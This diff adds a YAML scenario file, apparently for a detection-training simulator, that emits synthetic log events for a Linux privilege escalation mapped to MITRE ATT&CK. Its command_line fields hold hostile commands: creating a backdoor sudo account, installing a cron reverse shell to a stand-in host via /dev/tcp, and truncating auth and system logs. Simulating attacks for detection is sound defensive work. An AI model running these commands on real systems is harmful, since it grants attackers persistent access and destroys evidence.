@@ -1,0 +1,307 @@
+# ©AngelaMos | 2026
+# privilege_escalation.yml
+
+name: Privilege Escalation and Persistence
+description: >
+  Simulates a compromised service account that performs system
+  enumeration, exploits a kernel vulnerability for root access,
+  creates a backdoor admin account, installs a cron-based reverse
+  shell for persistence, and covers tracks by clearing logs. Based
+  on PrintNightmare-style exploitation patterns.
+
+mitre_tactics:
+  - TA0004
+  - TA0003
+  - TA0005
+  - TA0007
+mitre_techniques:
+  - T1068
+  - T1136.001
+  - T1053.005
+  - T1070.002
+
+events:
+  - delay_seconds: 1.0
+    source_type: auth
+    event_type: login_success
+    source_ip: 10.1.3.25
+    dest_ip: 10.1.2.10
+    hostname: app-server-01
+    username: svc-webapp
+    message: Normal service account login via SSH
+    auth_method: publickey
+    result: success
+    service: sshd
+    mitre_tactic: TA0001
+    mitre_technique: T1078.003
+
+  - delay_seconds: 3.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: svc-webapp
+    message: System information enumeration
+    process_name: uname
+    process_id: 12301
+    parent_process: bash
+    command_line: uname -a
+    mitre_tactic: TA0007
+    mitre_technique: T1082
+
+  - delay_seconds: 1.5
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: svc-webapp
+    message: Kernel version check for exploit matching
+    process_name: cat
+    process_id: 12310
+    parent_process: bash
+    command_line: cat /proc/version
+    file_path: /proc/version
+    mitre_tactic: TA0007
+    mitre_technique: T1082
+
+  - delay_seconds: 1.5
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: svc-webapp
+    message: SUID binary discovery for privilege escalation vectors
+    process_name: find
+    process_id: 12315
+    parent_process: bash
+    command_line: find / -perm -4000 -type f 2>/dev/null
+    mitre_tactic: TA0007
+    mitre_technique: T1083
+
+  - delay_seconds: 2.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: svc-webapp
+    message: Current user privilege enumeration
+    process_name: id
+    process_id: 12320
+    parent_process: bash
+    command_line: id && sudo -l 2>/dev/null
+    mitre_tactic: TA0007
+    mitre_technique: T1033
+
+  - delay_seconds: 2.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: svc-webapp
+    message: Writable directory discovery for exploit staging
+    process_name: find
+    process_id: 12330
+    parent_process: bash
+    command_line: find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null
+    mitre_tactic: TA0007
+    mitre_technique: T1083
+
+  - delay_seconds: 3.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: svc-webapp
+    message: Exploit source code compiled on target host
+    process_name: gcc
+    process_id: 12340
+    parent_process: bash
+    command_line: gcc -o /tmp/.exploit /tmp/.exploit.c -lpthread
+    file_path: /tmp/.exploit
+    mitre_tactic: TA0004
+    mitre_technique: T1068
+
+  - delay_seconds: 1.5
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: svc-webapp
+    message: Kernel exploit binary executed
+    process_name: .exploit
+    process_id: 12355
+    parent_process: bash
+    command_line: /tmp/.exploit
+    file_path: /tmp/.exploit
+    mitre_tactic: TA0004
+    mitre_technique: T1068
+
+  - delay_seconds: 2.0
+    source_type: endpoint
+    event_type: privilege_escalation
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: root
+    message: Privilege escalation to root via kernel exploit
+    process_name: bash
+    process_id: 12360
+    parent_process: .exploit
+    command_line: /bin/bash -p
+    mitre_tactic: TA0004
+    mitre_technique: T1068
+
+  - delay_seconds: 2.0
+    source_type: ids
+    event_type: ids_alert
+    source_ip: 10.1.2.10
+    hostname: ids-sensor-02
+    message: Privilege escalation detected on application server
+    signature_id: 2100366
+    signature_name: ET POLICY Potential Privilege Escalation
+    classification: attempted-admin
+    priority: 1
+    mitre_tactic: TA0004
+    mitre_technique: T1068
+
+  - delay_seconds: 3.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: root
+    message: Backdoor admin account created with sudo privileges
+    process_name: useradd
+    process_id: 12378
+    parent_process: bash
+    command_line: useradd -m -G sudo -s /bin/bash sysadm1n
+    mitre_tactic: TA0003
+    mitre_technique: T1136.001
+
+  - delay_seconds: 1.0
+    source_type: auth
+    event_type: account_created
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: root
+    message: New local account sysadm1n added to sudo group
+    auth_method: local
+    result: success
+    service: useradd
+    mitre_tactic: TA0003
+    mitre_technique: T1136.001
+
+  - delay_seconds: 1.5
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: root
+    message: Password set for backdoor admin account
+    process_name: chpasswd
+    process_id: 12385
+    parent_process: bash
+    command_line: echo sysadm1n:P@ssw0rd123 | chpasswd
+    mitre_tactic: TA0003
+    mitre_technique: T1136.001
+
+  - delay_seconds: 2.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: root
+    message: SSH authorized key installed for passwordless backdoor access
+    process_name: bash
+    process_id: 12395
+    parent_process: bash
+    command_line: mkdir -p /home/sysadm1n/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." > /home/sysadm1n/.ssh/authorized_keys
+    file_path: /home/sysadm1n/.ssh/authorized_keys
+    mitre_tactic: TA0003
+    mitre_technique: T1098.004
+
+  - delay_seconds: 3.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: root
+    message: Reverse shell cron job installed for persistent access
+    process_name: crontab
+    process_id: 12401
+    parent_process: bash
+    command_line: (crontab -l; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/203.0.113.42/4444 0>&1'") | crontab -
+    mitre_tactic: TA0003
+    mitre_technique: T1053.005
+
+  - delay_seconds: 2.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: root
+    message: Exploit binary and source removed to cover tracks
+    process_name: rm
+    process_id: 12430
+    parent_process: bash
+    command_line: rm -f /tmp/.exploit /tmp/.exploit.c
+    mitre_tactic: TA0005
+    mitre_technique: T1070.004
+
+  - delay_seconds: 1.5
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: root
+    message: Authentication log cleared to destroy evidence
+    process_name: truncate
+    process_id: 12445
+    parent_process: bash
+    command_line: truncate -s 0 /var/log/auth.log
+    file_path: /var/log/auth.log
+    mitre_tactic: TA0005
+    mitre_technique: T1070.002
+
+  - delay_seconds: 1.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.1.2.10
+    hostname: app-server-01
+    username: root
+    message: Syslog cleared to remove traces
+    process_name: truncate
+    process_id: 12450
+    parent_process: bash
+    command_line: truncate -s 0 /var/log/syslog
+    file_path: /var/log/syslog
+    mitre_tactic: TA0005
+    mitre_technique: T1070.002
+
+  - delay_seconds: 5.0
+    source_type: firewall
+    event_type: connection_allowed
+    source_ip: 10.1.2.10
+    dest_ip: 203.0.113.42
+    source_port: 48901
+    dest_port: 4444
+    hostname: fw-edge-01
+    message: Outbound reverse shell connection from cron backdoor
+    action: allow
+    protocol: tcp
+    rule_name: outbound-general
+    mitre_tactic: TA0011
+    mitre_technique: T1571
+
+  - delay_seconds: 1.0
+    source_type: ids
+    event_type: ids_alert
+    source_ip: 10.1.2.10
+    dest_ip: 203.0.113.42
+    hostname: ids-sensor-01
+    message: Reverse shell connection detected on non-standard port
+    signature_id: 2024897
+    signature_name: ET ATTACK_RESPONSE Possible Reverse Shell
+    classification: trojan-activity
+    priority: 1
+    mitre_tactic: TA0011
+    mitre_technique: T1571
